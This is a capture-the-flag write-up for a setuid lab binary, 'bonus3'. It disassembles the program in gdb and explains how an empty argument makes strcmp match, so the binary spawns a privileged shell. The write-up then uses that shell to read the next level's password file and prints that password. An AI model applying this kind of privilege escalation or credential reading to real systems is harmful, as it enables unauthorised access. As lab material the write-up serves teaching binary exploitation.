```shell
$> ls -la
[...]
-rwsr-s---+ 1 end    users  5595 Mar  6  2016 bonus3
[...]

$> ./bonus3

$> ./bonus3 test


$> ./bonus3 test test

# program takes 1 argument, and print nothing ...
```

```shell
$> gdb -q bonus3 
(gdb) i func
[...]
0x080484f4  main
[...]

# program only calls main()

(gdb) i var
[...]

# no interesting variable ....

(gdb) disas main
    [...]
    0x08048502 <+14>:    mov    edx,0x80486f0
    0x08048507 <+19>:    mov    eax,0x80486f2
        [...]
    0x08048513 <+31>:    call   0x8048410 <fopen@plt>           #1
    [...]
    0x0804854d <+89>:    lea    eax,[esp+0x18]
    0x08048551 <+93>:    mov    edx,DWORD PTR [esp+0x9c]
    0x08048558 <+100>:   mov    DWORD PTR [esp+0xc],edx
    0x0804855c <+104>:   mov    DWORD PTR [esp+0x8],0x42
    0x08048564 <+112>:   mov    DWORD PTR [esp+0x4],0x1
    0x0804856c <+120>:   mov    DWORD PTR [esp],eax
    0x0804856f <+123>:   call   0x80483d0 <fread@plt>
    0x08048574 <+128>:   mov    BYTE PTR [esp+0x59],0x0         #2
    [...]
    0x08048584 <+144>:   call   0x8048430 <atoi@plt>
    0x08048589 <+149>:   mov    BYTE PTR [esp+eax*1+0x18],0x0   #3
    0x0804858e <+154>:   lea    eax,[esp+0x18]
    0x08048592 <+158>:   lea    edx,[eax+0x42]
    0x08048595 <+161>:   mov    eax,DWORD PTR [esp+0x9c]
    0x0804859c <+168>:   mov    DWORD PTR [esp+0xc],eax
    0x080485a0 <+172>:   mov    DWORD PTR [esp+0x8],0x41
    0x080485a8 <+180>:   mov    DWORD PTR [esp+0x4],0x1
    0x080485b0 <+188>:   mov    DWORD PTR [esp],edx
    0x080485b3 <+191>:   call   0x80483d0 <fread@plt>           #4
    [...]
    0x080485c7 <+211>:   mov    eax,DWORD PTR [ebp+0xc]
    0x080485ca <+214>:   add    eax,0x4
    0x080485cd <+217>:   mov    eax,DWORD PTR [eax]
    0x080485cf <+219>:   mov    DWORD PTR [esp+0x4],eax
    0x080485d3 <+223>:   lea    eax,[esp+0x18]
    0x080485d7 <+227>:   mov    DWORD PTR [esp],eax
    0x080485da <+230>:   call   0x80483b0 <strcmp@plt>          #5
    0x080485df <+235>:   test   eax,eax
    0x080485e1 <+237>:   jne    0x8048601 <main+269>
    0x080485e3 <+239>:   mov    DWORD PTR [esp+0x8],0x0
    0x080485eb <+247>:   mov    DWORD PTR [esp+0x4],0x8048707
    0x080485f3 <+255>:   mov    DWORD PTR [esp],0x804870a
    0x080485fa <+262>:   call   0x8048420 <execl@plt>           #5.1
    0x080485ff <+267>:   jmp    0x8048610 <main+284>
    0x08048601 <+269>:   lea    eax,[esp+0x18]
    0x08048605 <+273>:   add    eax,0x42
    0x08048608 <+276>:   mov    DWORD PTR [esp],eax
    0x0804860b <+279>:   call   0x80483e0 <puts@plt>            #5.2
    [...]

#1: fopen() is called to open "/home/user/end/.pass" (0x80486f2) in read mode ("r": 0x80486f0) 
#2: fread() is called to read 0x42 bytes from the file opened by fopen() into the buffer (esp+0x18)
#3: the buffer is modified to add a null byte (0x0) at the index given by atoi(av[1]) (esp+eax*1+0x18)
#4: fread() is called again to read 0x41 bytes from the file opened by fopen() into the buffer + 0x42 (esp+0x18+0x42)
#5: strcmp() is called to compare the buffer (esp+0x18) with av[1] (esp+0xc+0x4)
#5.1: execl() is called to execute "/bin/sh" with the argument "-p" (0x8048707) if strcmp() returns 0
#5.2: puts() is called to print the buffer at the 66 bytes (esp+0x18+0x42) if strcmp() returns != 0
```

We have here a .pass file opened in read mode and the buffer save the content of the file, but finally the buffer print everytime empty because puts print the buffer at the 66 bytes.  
Also, we have a shell execute if condition of strcmp is adapted.  
We know buffer modified byte at the index given by atoi(av[1]) and strcmp compare the buffer with av[1].  

```shell
$> ./bonus3 ""

# if give empty parameter to atoi(), it return 0
# So buffer is modified at the index 0 and give a null byte (0x0)
# strcmp() should return 0 and execute the shell

$ whoami
end
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```